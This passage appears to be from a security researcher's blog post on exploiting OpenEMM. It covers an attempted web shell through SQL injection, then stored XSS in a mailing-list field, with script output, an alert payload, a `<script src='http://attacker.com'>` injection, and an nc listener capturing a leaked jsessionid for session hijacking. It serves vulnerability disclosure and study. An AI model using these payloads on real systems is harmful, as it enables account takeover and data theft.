<p>Our &ldquo;end goal&rdquo; for this exploit is, however, not just adding mailing lists or deleting content; we&rsquo;d like to obtain a web shell.  As OpenEMM is written in Java (struts), Java Server Pages (JSP) are invoked server-side to render client-side pages.  Theoretically, we should be able to dump a malicious JSP file into a readable/writable directory and obtain a remote shell.</p>

<p>Unfortunately (fortunately for users/OpenEMM, though), the user used to connect to the MySQL database does not have FILE permissions:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mysql&gt; select user();
</span><span class='line'>+-------------------+
</span><span class='line'>| user()            |
</span><span class='line'>+-------------------+
</span><span class='line'>| agnitas@localhost |
</span><span class='line'>+-------------------+
</span><span class='line'>1 row in set (0.00 sec)
</span><span class='line'>
</span><span class='line'>mysql&gt; show grants;
</span><span class='line'>+----------------------------------------------------------------------------------------------------------------------------------------------------+
</span><span class='line'>| Grants for agnitas@localhost                                                                                                                       |
</span><span class='line'>+----------------------------------------------------------------------------------------------------------------------------------------------------+
</span><span class='line'>| GRANT USAGE ON *.* TO 'agnitas'@'localhost' IDENTIFIED BY PASSWORD '*BC428C4FAA04992D1E8CF04545DD70FA60E588C5'                                     |
</span><span class='line'>| GRANT SELECT, INSERT, UPDATE, DELETE, CREATE, DROP, INDEX, ALTER, CREATE TEMPORARY TABLES, LOCK TABLES ON `openemm`.* TO 'agnitas'@'localhost'     |
</span><span class='line'>| GRANT SELECT, INSERT, UPDATE, DELETE, CREATE, DROP, INDEX, ALTER, CREATE TEMPORARY TABLES, LOCK TABLES ON `openemm_cms`.* TO 'agnitas'@'localhost' |
</span><span class='line'>+----------------------------------------------------------------------------------------------------------------------------------------------------+
</span><span class='line'>3 rows in set (0.00 sec)
</span><span class='line'>
</span><span class='line'>mysql&gt; </span></code></pre></td></tr></table></div></figure>


<p>This is the user specified by <code>webapps/openemm/WEB-INF/classes/emm.properties</code>.  As shown, we have only basic access to the databases.  In the event that this user and permissions are modified, it is possible to upload a web shell, but in its default state, you cannot.</p>

<p>From this SQL injection, then, we have authentication bypass and information disclosure.  Because this interface inserts data directly into databases, and does not go through a unified channel (i.e. for their basic sanitation methods), several fields are vulnerable to XSS, including a new mailing list&rsquo;s Description field:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@jali:~/exploits# python openemm_wsdl.py -i 192.168.1.83 -m w00t
</span><span class='line'>[!] Description field vulnerable to stored xss!
</span><span class='line'>[!] Enter mlist description: &lt;script&gt;alert('XSS!')&lt;/script&gt;
</span><span class='line'>[!] Saved successfully
</span><span class='line'>root@jali:~/exploits# </span></code></pre></td></tr></table></div></figure>


<p><img class="center" src="http://2.bp.blogspot.com/-lYlTr36HnSM/Uer_nBvALcI/AAAAAAAAAhY/vtunAxjrjfs/s640/xss.jpg"></p>

<p>With this, we can siphon off session ID&rsquo;s by simply injecting <code>&lt;script src="http://attacker.com"/&gt;</code>.  We do not need to send document.cookie because, surprise, session ID&rsquo;s are not stored as a cookie, but rather passed around through each GET/POST request.  Therefore, the Referrer header will contain the jsessionid required to hijack the session.  Our hijacked request looks as such:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@jali:~/exploits# nc -l -p 80
</span><span class='line'>GET / HTTP/1.1
</span><span class='line'>Host: 192.168.1.147
</span><span class='line'>User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0
</span><span class='line'>Accept: */*
</span><span class='line'>Accept-Language: en-US,en;q=0.5
</span><span class='line'>Accept-Encoding: gzip, deflate
</span><span class='line'>DNT: 1
</span><span class='line'>Referer: http://192.168.1.83:8080/mailinglist.do;jsessionid=CBD95DD7B9B1ABF9C8922BC2DC5047E3?action=1
</span><span class='line'>Connection: keep-alive
</span><span class='line'>
</span><span class='line'>^C
</span><span class='line'>root@jali:~/exploits# </span></code></pre></td></tr></table></div></figure>


<p>We then simply make the same request in the Referrer field and we&rsquo;ve got access to the account.</p>

<p><a href="http://pastebin.com/JLh7BYYj">Exploit</a><br/>
<a href="http://pastebin.com/GXdw3FcQ">wsdl</a></p>
]]></content>
  </entry>
  
</feed>
